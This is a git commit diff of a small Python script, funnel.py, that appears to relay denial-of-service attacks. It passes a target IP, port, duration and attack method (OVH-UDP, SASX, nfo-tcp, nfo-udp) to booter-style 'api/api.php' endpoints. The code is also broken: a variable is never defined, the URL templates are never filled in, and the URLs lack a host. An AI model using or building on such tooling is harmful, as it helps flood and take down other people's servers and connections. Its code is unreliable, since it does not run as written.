f8b6a40423c648e1747e007d1aed18f54bcffb95
atomdata999 <100035372+atomdata999@users.noreply.github.com>
2022-06-13 01:38:41 -0400

    Update funnel.py

--- funnel.py
+++ funnel.py
@@ -2,24 +2,31 @@ import requests
 import sys
 import os
 #this is just an example nothing big 
+
 ip = sys.argv[1]
 port = int((sys.argv[2]))
 time = int((sys.argv[3]))
 method = sys.argv[4]
+
 def main():
-	if method == "nfo":
-		url = f"http://ip/?api&host={ip}&port={port}&time={time}&method={method}"
-		url2 = f"http://ip/?api&host={ip}&port={port}&time={time}&method={method}"
+	if server == "Bypass":
+		bypass()
+	if server == "Home":
+		home()
+	else:
+		print("error")
+
+def bypass():
+	if method == "ovh":
+		url = "api/api.php&host={ip}&port={port}&time={time}&method=SASX"
+		url2 = "api/api.php&host={ip}&port={port}&time={time}&method=OVH-UDP"
 		requests.get(url)
 		requests.get(url2)
-	elif method == "home-v2":
-		url = f"http://ip/?api&host={ip}&port={port}&time={time}&method={method}"
-		url2 = f"http://ip/?api&host={ip}&port={port}&time={time}&method={method}"
-		requests.get(url)
-		requests.get(url2) 
-	elif method == "ovh-x":
-		url = f"http://ip/?api&host={ip}&port={port}&time={time}&method={method}"
-		url2 = f"http://ip/?api&host={ip}&port={port}&time={time}&method={method}"
+
+def home():
+	if method == "nfo":
+		url = "api/api.php&host={ip}&port={port}&time={time}&method=nfo-tcp"
+		url2 = "api/api.php&host={ip}&port={port}&time={time}&method=nfo-udp"
 		requests.get(url)
 		requests.get(url2)
 
